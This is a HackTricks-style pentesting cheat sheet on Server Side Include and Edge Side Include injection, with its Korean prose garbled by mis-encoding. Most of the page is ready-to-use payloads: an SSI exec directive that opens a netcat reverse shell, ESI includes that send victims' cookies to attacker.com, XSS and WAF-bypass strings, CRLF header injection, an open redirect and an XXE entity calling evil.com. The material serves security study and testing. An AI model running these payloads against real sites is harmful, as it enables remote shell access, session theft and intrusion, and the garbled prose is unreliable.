# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Introduction taken from [Apache docs](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (ì„œë²„ ì‚¬ì´ë“œ í¬í•¨)ëŠ” **HTML í˜ì´ì§€ì— ë°°ì¹˜ë˜ê³ , í˜ì´ì§€ê°€ ì œê³µë˜ëŠ” ë™ì•ˆ ì„œë²„ì—ì„œ í‰ê°€ë˜ëŠ” ì§€ì‹œì–´**ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ **ê¸°ì¡´ HTML í˜ì´ì§€ì— ë™ì ìœ¼ë¡œ ìƒì„±ëœ ì½˜í…ì¸ ë¥¼ ì¶”ê°€**í•  ìˆ˜ ìˆìœ¼ë©°, ì „ì²´ í˜ì´ì§€ë¥¼ CGI í”„ë¡œê·¸ë¨ì´ë‚˜ ë‹¤ë¥¸ ë™ì  ê¸°ìˆ ì„ í†µí•´ ì œê³µí•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.\
ì˜ˆë¥¼ ë“¤ì–´, ê¸°ì¡´ HTML í˜ì´ì§€ì— ë‹¤ìŒê³¼ ê°™ì€ ì§€ì‹œì–´ë¥¼ ë°°ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

`<!--#echo var="DATE_LOCAL" -->`

ê·¸ë¦¬ê³  í˜ì´ì§€ê°€ ì œê³µë  ë•Œ, ì´ ì¡°ê°ì€ í‰ê°€ë˜ì–´ ê·¸ ê°’ìœ¼ë¡œ ëŒ€ì²´ë©ë‹ˆë‹¤:

`Tuesday, 15-Jan-2013 19:28:54 EST`

SSIë¥¼ ì‚¬ìš©í•  ì‹œì ê³¼ í˜ì´ì§€ë¥¼ ì™„ì „íˆ ìƒì„±í•  í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•  ì‹œì ì˜ ê²°ì •ì€ ì¼ë°˜ì ìœ¼ë¡œ í˜ì´ì§€ì˜ ì •ì  ë¶€ë¶„ê³¼ í˜ì´ì§€ê°€ ì œê³µë  ë•Œë§ˆë‹¤ ì¬ê³„ì‚°í•´ì•¼ í•˜ëŠ” ë¶€ë¶„ì˜ ì–‘ì— ë”°ë¼ ë‹¬ë¼ì§‘ë‹ˆë‹¤. SSIëŠ” í˜„ì¬ ì‹œê°„ê³¼ ê°™ì€ ì‘ì€ ì •ë³´ë¥¼ ì¶”ê°€í•˜ëŠ” í›Œë¥­í•œ ë°©ë²•ì…ë‹ˆë‹¤ - ìœ„ì— í‘œì‹œëœ ê²ƒì²˜ëŸ¼. ê·¸ëŸ¬ë‚˜ í˜ì´ì§€ì˜ ëŒ€ë¶€ë¶„ì´ ì œê³µë  ë•Œ ìƒì„±ëœë‹¤ë©´, ë‹¤ë¥¸ ì†”ë£¨ì…˜ì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ **`.shtml`, `.shtm` ë˜ëŠ” `.stm`** í™•ì¥ìë¥¼ ê°€ì§„ íŒŒì¼ì„ ì‚¬ìš©í•œë‹¤ë©´ SSIì˜ ì¡´ì¬ë¥¼ ì¶”ë¡ í•  ìˆ˜ ìˆì§€ë§Œ, ê·¸ê²ƒë§Œì´ ì „ë¶€ëŠ” ì•„ë‹™ë‹ˆë‹¤.

ì „í˜•ì ì¸ SSI í‘œí˜„ì‹ì€ ë‹¤ìŒ í˜•ì‹ì„ ê°€ì§‘ë‹ˆë‹¤:
```
<!--#directive param="value" -->
```
### í™•ì¸
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

ì •ë³´ë¥¼ **ìºì‹±í•˜ê±°ë‚˜ ë™ì  ì• í”Œë¦¬ì¼€ì´ì…˜**ì˜ ì¼ë¶€ë¡œì„œ ì½˜í…ì¸ ê°€ ë‹¤ìŒ ë²ˆì— ì½˜í…ì¸ ë¥¼ ê²€ìƒ‰í•  ë•Œ **ë‹¤ë¥¼ ìˆ˜** ìˆë‹¤ëŠ” ë¬¸ì œê°€ ìˆìŠµë‹ˆë‹¤. ì´ê²ƒì´ **ESI**ê°€ ì‚¬ìš©ë˜ëŠ” ì´ìœ ë¡œ, ESI íƒœê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ **ìƒì„±í•´ì•¼ í•˜ëŠ” ë™ì  ì½˜í…ì¸ **ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.\
ë§Œì•½ **ê³µê²©ì**ê°€ ìºì‹œ ì½˜í…ì¸  ë‚´ì— **ESI íƒœê·¸ë¥¼ ì£¼ì…**í•  ìˆ˜ ìˆë‹¤ë©´, ê·¸ëŠ” ë¬¸ì„œê°€ ì‚¬ìš©ìì—ê²Œ ì „ì†¡ë˜ê¸° ì „ì— **ì„ì˜ì˜ ì½˜í…ì¸ ë¥¼ ì£¼ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ESI Detection

ì„œë²„ì˜ ì‘ë‹µì—ì„œ ë‹¤ìŒ **í—¤ë”**ëŠ” ì„œë²„ê°€ ESIë¥¼ ì‚¬ìš©í•˜ê³  ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:
```
Surrogate-Control: content="ESI/1.0"
```
ì´ í—¤ë”ë¥¼ ì°¾ì„ ìˆ˜ ì—†ë‹¤ë©´, ì„œë²„ëŠ” **ì–´ì¨Œë“  ESIë¥¼ ì‚¬ìš©í•˜ê³  ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
**ë¸”ë¼ì¸ë“œ ìµìŠ¤í”Œë¡œì‡ ì ‘ê·¼ ë°©ì‹ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ìš”ì²­ì€ ê³µê²©ìì˜ ì„œë²„ì— ë„ì°©í•´ì•¼ í•©ë‹ˆë‹¤:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI ì•…ìš©

[GoSecureëŠ”](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) ë‹¤ì–‘í•œ ESI ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì— ëŒ€í•´ ì‹œë„í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥í•œ ê³µê²©ì„ ì´í•´í•˜ê¸° ìœ„í•œ í‘œë¥¼ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤:

* **Includes**: `<esi:includes>` ì§€ì‹œì–´ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.
* **Vars**: `<esi:vars>` ì§€ì‹œì–´ë¥¼ ì§€ì›í•©ë‹ˆë‹¤. XSS í•„í„°ë¥¼ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤.
* **Cookie**: ë¬¸ì„œ ì¿ í‚¤ëŠ” ESI ì—”ì§„ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Upstream Headers Required**: ìƒìœ„ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ í—¤ë”ë¥¼ ì œê³µí•˜ì§€ ì•Šìœ¼ë©´ ëŒ€ë¦¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ESI ë¬¸ì¥ì„ ì²˜ë¦¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Host Allowlist**: ì´ ê²½ìš° ESI í¬í•¨ì€ í—ˆìš©ëœ ì„œë²„ í˜¸ìŠ¤íŠ¸ì—ì„œë§Œ ê°€ëŠ¥í•˜ë¯€ë¡œ, ì˜ˆë¥¼ ë“¤ì–´ SSRFëŠ” í•´ë‹¹ í˜¸ìŠ¤íŠ¸ì— ëŒ€í•´ì„œë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤.

|         **ì†Œí”„íŠ¸ì›¨ì–´**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Yes     |    Yes   |     Yes     |              Yes              |         No         |
|         Varnish Cache        |      Yes     |    No    |      No     |              Yes              |         Yes        |
|            Fastly            |      Yes     |    No    |      No     |               No              |         Yes        |
| Akamai ESI Test Server (ETS) |      Yes     |    Yes   |     Yes     |               No              |         No         |
|          NodeJS esi          |      Yes     |    Yes   |     Yes     |               No              |         No         |
|         NodeJS nodesi        |      Yes     |    No    |      No     |               No              |      Optional      |

#### XSS

ë‹¤ìŒ ESI ì§€ì‹œì–´ëŠ” ì„œë²„ì˜ ì‘ë‹µ ë‚´ì—ì„œ ì„ì˜ì˜ íŒŒì¼ì„ ë¡œë“œí•©ë‹ˆë‹¤.
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### í´ë¼ì´ì–¸íŠ¸ XSS ë³´í˜¸ ìš°íšŒ
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### ì¿ í‚¤ í›”ì¹˜ê¸°

* ì›ê²© ì¿ í‚¤ í›”ì¹˜ê¸°
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* XSSë¥¼ ì‚¬ìš©í•˜ì—¬ ì‘ë‹µì— ë°˜ì˜í•˜ì—¬ HTTP\_ONLY ì¿ í‚¤ë¥¼ í›”ì¹˜ê¸°:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Private Local File

ì´ê²ƒì„ "ë¡œì»¬ íŒŒì¼ í¬í•¨(Local File Inclusion)"ê³¼ í˜¼ë™í•˜ì§€ ë§ˆì‹­ì‹œì˜¤:
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

ë‹¤ìŒì€ ì‘ë‹µì— `Location` í—¤ë”ë¥¼ ì¶”ê°€í•©ë‹ˆë‹¤.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Add Header

* ê°•ì œ ìš”ì²­ì— í—¤ë” ì¶”ê°€
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* ì‘ë‹µì— í—¤ë” ì¶”ê°€ (XSSê°€ ìˆëŠ” ì‘ë‹µì—ì„œ "Content-Type: text/json" ìš°íšŒë¥¼ ìœ„í•´ ìœ ìš©í•¨)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF in Add header (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

ì´ê²ƒì€ ì‘ë‹µì— í¬í•¨ëœ ë””ë²„ê·¸ ì •ë³´ë¥¼ ì „ì†¡í•©ë‹ˆë‹¤:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

`_dca_` ë§¤ê°œë³€ìˆ˜ì— ëŒ€í•´ `xslt` ê°’ì„ ì§€ì •í•¨ìœ¼ë¡œì¨ **`eXtensible Stylesheet Language Transformations (XSLT)`** ê¸°ë°˜ ESIë¥¼ í¬í•¨í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ í¬í•¨ì€ HTTP ëŒ€ë¦¬ ì„œë²„ê°€ XML ë° XSLT íŒŒì¼ì„ ê²€ìƒ‰í•˜ê²Œ í•˜ë©°, í›„ìëŠ” ì „ìë¥¼ í•„í„°ë§í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ XML íŒŒì¼ì€ _XML External Entity (XXE)_ ê³µê²©ì— ì•…ìš©ë  ìˆ˜ ìˆì–´ ê³µê²©ìê°€ SSRF ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ ì ‘ê·¼ ë°©ì‹ì˜ ìœ ìš©ì„±ì€ ì œí•œì ì…ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ESIëŠ” ì´ë¯¸ SSRF ë²¡í„°ë¡œ ì‘ìš©í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê¸°ë³¸ Xalan ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì§€ì›ì´ ì—†ê¸° ë•Œë¬¸ì— ì™¸ë¶€ DTDëŠ” ì²˜ë¦¬ë˜ì§€ ì•Šì•„ ë¡œì»¬ íŒŒì¼ ì¶”ì¶œì´ ë°©ì§€ë©ë‹ˆë‹¤.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT íŒŒì¼:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT page:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### References

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
